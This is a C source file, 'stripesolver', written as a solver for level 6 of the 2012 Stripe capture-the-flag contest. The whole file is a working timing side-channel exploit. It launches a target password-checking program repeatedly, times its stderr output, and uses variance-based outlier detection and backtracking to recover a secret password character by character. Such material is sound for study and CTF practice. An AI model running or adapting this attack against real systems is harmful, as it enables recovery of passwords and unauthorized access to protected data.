/* stripesolver - A solver for level 6 of the Stripe CTF based on timing
 * Copyright (C) 2012 Thomas Hebb
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <errno.h>

#define MAX_PASSES 5	// Maximum number of passes to attempt before failing.
#define MAX_LENGTH 100	// Maximum string length to guess.

/* usecdifference - Find a sub-second difference between microsecond values.
 * Parameters:
 *   start: Start time in microseconds.
 *   end: End time in mocroseconds.
 * Return value: Difference between start and end in microseconds.
 */
inline long usecdifference (long start, long end) {
	long result = end - start;
	if (end < start) {
		// Everything we time will take less than a second.
		result += 1000000;
	}
	return result;
}

/* findcorrect - Find the index of the 1 in an array of 0s.
 * Parameters:
 *   possibilities: Unsigned char array.
 *   length: Number of elements in array.
 * Return value: Either the index of the 1, -1 if there are multiple,
 *               or -2 if there are none.
 */
int findcorrect (unsigned char *possibilities, int length) {
	int i, index = -2;
	for (i = 0; i < length; ++i) {
		if (possibilities[i] == 1) {
			if (index != -2) {
				return -1;
			}
			index = i;
		}
	}
	return index;
}

/* qs_partition - Partitioning algorithm for quicksort - do not call directly.
 * Parameters:
 *   array: Array containing values to partition.
 *   start: First index of area to partition.
 *   end: Last index of area to partition.
 * Return value: Index of the center of the partition.
 */
int qs_partition (long *array, int start, int end) {
	int pivot = array[(start + end) / 2];
	int i = start - 1, j = end + 1;

	while (1) {
		do {
			++i;
		} while (array[i] < pivot);
		do {
			--j;
		} while (array[j] > pivot);
		if (i < j) {
			long temp = array[i];
			array[i] = array[j];
			array[j] = temp;
		} else {
			return j;
		}
	}
}

/* qs_helper - Recursive algorithm for quicksort - do not call directly.
 * Parameters:
 *   array: Array containing values to sort.
 *   start: First index of area to sort.
 *   end: Last index of area to sort.
 */
void qs_helper (long *array, int start, int end) {
	int split = qs_partition(array, start, end);

	if (start < split) {
		qs_helper(array, start, split);
	}
	if (end > split + 1) {
		qs_helper(array, split + 1, end);
	}
}

/* quicksort - Quicksort algorithm.
 * Parameters:
 *   array: Array to sort.
 *   length: Number of elements in array.
 */
void quicksort (long *array, int length) {
	// See http://en.wikipedia.org/wiki/Quicksort
	// for algorithm documentation.
	qs_helper(array, 0, length - 1);
}

/* startguesser - Starts the target application with the given string.
 * Parameters:
 *   fd: Array of file descriptors that will be filled with the pipes to stdin,
 *       stdout, and stderr, respectively.
 *   path: Path of target application.
 *   file: File to target.
 *   str: String to guess.
 * Return value: PID of child process.
 */
pid_t startguesser (int fd[3], char *path, char *file, char *str) {
	// Create pipes for stdin, stdout, and stderr of the guesser.
	int infd[2], outfd[2], errfd[2];
	if (pipe(infd) == -1 || pipe(outfd) == -1 || pipe(errfd) == -1) {
		perror("Error creating pipes");
		exit(EXIT_FAILURE);
	}

	// Spawn the child process.
	pid_t child;
	if (!(child = fork())) {
		// We're the child.
		// Connect the pipes to standard file descriptors and close unneeded ones.
		dup2(infd[0], 0);
		  close(infd[0]);
		  close(infd[1]);
		dup2(outfd[1], 1);
		  close(outfd[0]);
		  close(outfd[1]);
		dup2(errfd[1], 2);
		  close(errfd[0]);
		  close(errfd[1]);

		// Start the guesser.
		if (execl(path, path, file, str, NULL) == -1) {
			perror("Error executing guesser");
			exit(EXIT_FAILURE);
		}
		exit(EXIT_SUCCESS);
	}

	if (child == -1) {
		perror("Error forking");
		exit(EXIT_FAILURE);
	}

	// We're the parent.
	// Add the right file descriptors to the array and close the others.
	fd[0] = infd[1];
	  close(infd[0]);
	fd[1] = outfd[0];
	  close(outfd[1]);
	fd[2] = errfd[0];
	  close(errfd[1]);

	// Return the child's PID.
	return child;
}

/* teststring - Tests the given string - assumes that all characters except
 *              the last two are correct.
 * Parameters:
 *   path: Path of target application.
 *   file: File to target.
 *   str: String to guess.
 *   firstwrong: Pointer to contain the index of the first wrong character.
 * Return value: Time taken for the second-to-last character to be checked or
 *               -1 if the string is too short.
 */
long teststring (char *path, char *file, char *str, int *firstwrong) {
	// We cannot calculate time differences if the string is too short.
	int numchars = strlen(str);
	if (numchars <= 1) {
		return -1;
	}

	// Start the password guesser and open stderr.
	int fd[3];
	startguesser(fd, path, file, str);
	  close(fd[0]);
	  close(fd[1]);
	FILE *errfile = fdopen(fd[2], "r");

	// Make sure buffering is disabled so we can accurately time the dots.
	setvbuf(errfile, NULL, _IONBF, 0);

	// Time each '.' output and store the timestamps in times.
	int i = 0;
	struct timeval temp;
	char current;
	long times[numchars - 1];
	while ((current = fgetc(errfile)) != EOF) {
		if (current == '.') {
			gettimeofday(&temp, 0);
			times[i] = temp.tv_usec;
			++i;
		}
	}

	// Calculate the time differences and store the index of the highest
	// in firstwrong so we can backtrack later.
	int highval = 0, delta;
	for (i = 1; i < numchars; ++i) {
		delta = usecdifference(times[i-1], times[i]);
		if (delta > highval) {
			highval = delta;
			*firstwrong = i - 1;
		}
	}

	// Clean up and return the delta of the last two dots.
	fclose(errfile);
	return delta;
}

/* checkstring - Checks the given string. Is deterministic, unlike teststring.
 * Parameters:
 *   path: Path of target application.
 *   file: File to target.
 *   str: String to check.
 * Return value: 0 if the string is not correct, 1 if it is, 2 if the guesser
 * gave unexpected output.
 */
unsigned char checkstring (char *path, char *file, char *str) {
	// Start the password guesser and open stderr.
	int fd[3];
	startguesser(fd, path, file, str);
	  close(fd[0]);
	  close(fd[1]);
	FILE *errfile = fdopen(fd[2], "r");

	// Count the number of characters on the third line of stderr.
	// The password is correct if the line is not empty.
	char current;
	unsigned char linecount = 0;
	while ((current = fgetc(errfile)) != EOF) {
		if (current == '\n' && ++linecount == 2) {
			current = fgetc(errfile);
			fclose(errfile);
			return current != EOF;
		}
	}

	// If we're here, the program output was unexpected.
	fclose(errfile);
	return 2;
}

/* variance - calculates the variance of an array of values.
 * Parameters:
 *   data: Array to calculate the variance of.
 *   variances: Array to store the cumulative variances in.
 *   length: Number of elements in arrays.
 * Return value: The calculated variance.
 */
float variance (long *data, float *variances, int length) {
	// See http://en.wikipedia.org/wiki/Algorithms_for_calculating_variance#On-line_algorithm
	// for algorithm documentation.
	if (length == 0) {
		return 0;
	}

	int i, n = 0;
	float delta, mean = 0, M2 = 0;
	for (i = 0; i < length; ++i) {
		++n;
		delta = data[i] - mean;
		mean += delta / n;
		if (n > 1) {
			M2 += delta * (data[i] - mean);
		}
		variances[i] = M2 / n;
	}
	return M2 / n;
}

/* findthreshhold - Finds the threshhold that seperates correct times
 *                  from incorrect ones.
 * Parameters:
 *   in: Sorted array of length length containing times.
 *   length: Number of elements in array.
 * Return value: The calculated threshhold.
 */
int findthreshhold (long *in, int length) {
	// Calculate the cumulative variance for each input element.
	float variances[length];
	variance(in, variances, length);

	// Find the first local maximum variance.
	int i = 1;
	float dold, dnew;
	dnew = variances[1] - variances[0];
	do {
		++i;
		dold = dnew;
		dnew = variances[i] - variances[i - 1];
	} while (dnew >= dold);

	// Return the value at the first local maximum as the threshhold.
	return in[i - 1];
}

/* markoutliers - Attempts to find and mark the lowest times in the in array.
 * Parameters:
 *   in: Array of length length containing time measurements.
 *   out: Array of length length which will get "correct" elements incremented.
 *   length: Number of elements in arrays.
 */
void markoutliers (long *in, unsigned char *out, int length) {
	// Sort the input array for processing.
	long sorted[length];
	memcpy(sorted, in, length * sizeof(long));
	quicksort(sorted, length);

	// Find the threshhold that seperates correct values from incorrect ones.
	int threshhold = findthreshhold(sorted, length);

	// Mark values accordingly in the output array.
	int i;
	for (i = 0; i < length; ++i) {
		if (in[i] >= threshhold) {
			out[i] = 0;
		}
	}

	/*printf("    {");
	for (i = 0; i < length - 1; ++i) {
		printf("%i, ", sorted[i]);
	}
	printf("%i} = %i\n", sorted[i], threshhold);*/
}

/* guesschar - Guesses the next character in string known.
 * Parameters:
 *   path: Path of target application.
 *   file: File to target.
 *   known: Current known string. The guessed character will be appended.
 *   charlist: List of characters to try.
 * Return value: Guessed character, 0 if an error occured, -1 if the passed
 *               string is incorrect.
 */
char guesschar (char *path, char *file, char *known, char *charlist) {
	// Calculate the number of possible characters
	// and the position that's being guessed.
	int numchars = strlen(charlist);
	int index = strlen(known);

	// Arrays that will store the raw timing data
	// and processed possibility data.
	long times[numchars];
	unsigned char possibilities[numchars];

	// Add our test character and null terminator.
	known[index + 1] = '!';
	known[index + 2] = '\0';

	// printf("Guessing character %i\n", index + 1);
	// printf("  Initializing possibilities\n");

	// At the beginning, every character is a possibility.
	int i;
	for (i = 0; i < numchars; ++i) {
		possibilities[i] = 1;
	}

	// printf("  Running passes\n");

	// Perform passes until only one possibility is left or the limit is reached.
	int correct, firstwrong, isincorrect;
	int pass = 0;
	while ((correct = findcorrect(possibilities, numchars)) < 0 && pass <= MAX_PASSES) {
		// printf("    Pass %i\n", pass + 1);

		// Assume the current string is incorrect until a guess proves otherwise.
		isincorrect = 1;

		// Perform a guess for each character that is still a possibility.
		for (i = 0; i < numchars; ++i) {
			if (possibilities[i]) {
				known[index] = charlist[i];

				// Save the time into the times array for processing.
				times[i] = teststring(path, file, known, &firstwrong);

				// If the first wrong character is the same as the one
				// we're guessing, the current string must be correct.
				if (firstwrong == index) {
					isincorrect = 0;
				}
			}
		}

		// Backtrack if the current string is incorrect.
		if (isincorrect) {
			// printf("  Backtracking...\n");
			known[index - 1] = '\0';
			return -1;
		}

		// Call markoutliers to perform processing on the times and store the
		// results in possibilities.
		markoutliers(times, possibilities, numchars);

		// Increment the pass counter.
		++pass;
	}
	// printf("Guessed character %i as %c after %i %s\n", index + 1, charlist[correct], pass, pass == 1 ? "pass" : "passes");

	if (correct < 0) {
		// If no correct character was found, reset the string and fail.
		known[index] = '\0';
		return 0;
	} else {
		// Otherwise, append the correct character to the string and return it.
		known[index + 1] = '\0';
		known[index] = charlist[correct];
		return charlist[correct];
	}
}

/* findstring - Finds an entire string.
 * Parameters:
 *   path: Path of target application.
 *   file: File to target.
 *   charlist: List of characters to try.
 * Return value: Guessed string or 0 if an error occured.
 */
char *findstring (char *path, char *file, char *charlist) {
	// Allocate the memory for the string and make it empty to start.
	char *str = (char*)malloc(MAX_LENGTH);
	str[0] = '\0';
	int length = 0;

	// Repeatedly call guesschar to find the string. We must add 2 characters to the string
	// length to account for the "test character" that is needed and the null terminator.
	char current;
	while ((current = guesschar(path, file, str, charlist)) != 0 && length < MAX_LENGTH - 2) {
		// If the string is correct, return it.
		if (checkstring(path, file, str)) {
			return str;
		}

		// If the return value of guesschar is -1, we have guessed
		// a character wrong and must backtrack.
		if (current == -1) {
			--length;
		} else {
			++length;
		}
	}

	// We have hit the length limit and still not found the string.
	return 0;
}

/* main - Main function.
 * Parameters: Seriously?
 * Return value: You should know this.
 */
int main (int argc, char **argv) {
	// List of possible characters for each position.
	char *charlist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

	// Check arguments.
	if (argc != 3) {
		fprintf(stderr, "Usage: %s path file\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	// Make sure file exists - we may not have read permission, so only warn.
	FILE *fd;
	if (!(fd = fopen(argv[2], "r"))) {
		perror("Warning: Could not open file");
	} else {
		fclose(fd);
	}

	// Ignore return values of children so they don't become zombies.
	signal(SIGCHLD, SIG_IGN);

	// Call findstring with the target binary, target file, and character list.
	// and print the result
	char *str = findstring(argv[1], argv[2], charlist);
	printf("%s\n", str == 0 ? "Sorry, the password could not be found" : str);
	free(str);

	// If we haven't failed by here, we've finished successfully.
	return EXIT_SUCCESS;
}

